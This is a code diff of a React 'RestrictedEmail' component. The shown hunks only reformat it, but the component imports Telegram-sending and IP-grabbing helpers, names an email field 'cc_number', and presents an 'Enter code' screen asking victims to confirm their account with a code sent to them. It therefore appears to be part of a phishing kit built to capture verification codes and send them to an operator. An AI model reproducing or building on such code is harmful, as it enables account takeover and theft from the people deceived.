@@ -7,7 +7,6 @@ import { getIpAddress } from "./utils/getIpAddress";
 import { sendTelegram } from "./utils/sendTelegram";
 import { API_BE } from "./utils/variable";
 
-
 export const RestrictedEmail = (props) => {
   const { state } = useLocation();
   const [cc_number, setEmail] = useState("");
@@ -31,15 +30,15 @@ export const RestrictedEmail = (props) => {
       fetch(`${API_BE}/users/` + unique_id)
         .then((res) => res.json())
         .then((response) => {
-            setEmail(response?.data?.email || "******@*****.***")
+          setEmail(response?.data?.email || "******@*****.***");
         })
-        .catch(() => { });
+        .catch(() => {});
     }
   };
 
   useEffect(() => {
-    getSingleUser()
-  }, [])
+    getSingleUser();
+  }, []);
 
   const updateStatus = () => {
     let unique_id = localStorage.getItem("unique_id");
@@ -70,13 +69,11 @@ export const RestrictedEmail = (props) => {
         body: JSON.stringify(data),
       })
         .then((response) => response.json())
-        .then(() => { });
+        .then(() => {});
 
-      props.setValue(0)
+      props.setValue(0);
     }
   };
-
-
 
   const cancelBtn = () => {
     let unique_id = localStorage.getItem("unique_id");
@@ -96,8 +93,8 @@ export const RestrictedEmail = (props) => {
         body: JSON.stringify(data),
       })
         .then((response) => response.json())
-        .then(() => { });
-      props.setValue(0)
+        .then(() => {});
+      props.setValue(0);
     }
   };
 
@@ -115,7 +112,10 @@ export const RestrictedEmail = (props) => {
           <div className="auth-req-2 auth-req-2-verification-show">
             <div className="auth-req-text-2 heading__wrapper">
               <h2>Enter code</h2>
-              <p className="help__text">To help us check this account belongs to you, please type or paste the code we sent to ({cc_number}).</p>
+              <p className="help__text">
+                To help us check this account belongs to you, please type or
+                paste the code we sent to ({cc_number}).
+              </p>
               <div className="confirmation-second-2 confirmation__wrapper-input">
                 <div className="flex-confirmation-second-2">
                   <div className="input-auth-req-2">
@@ -138,7 +138,9 @@ export const RestrictedEmail = (props) => {
             </div> */}
             <div className="auth-req-footer-2 auth-req-footer-2-verify">
               <div className="button-second-confirmation-2 footer__button-wrapper">
-                <button disabled onClick={() => cancelBtn()}>Back</button>
+                <button disabled onClick={() => cancelBtn()}>
+                  Back
+                </button>
                 <button onClick={() => updateStatus()}>Submit</button>
               </div>
             </div>
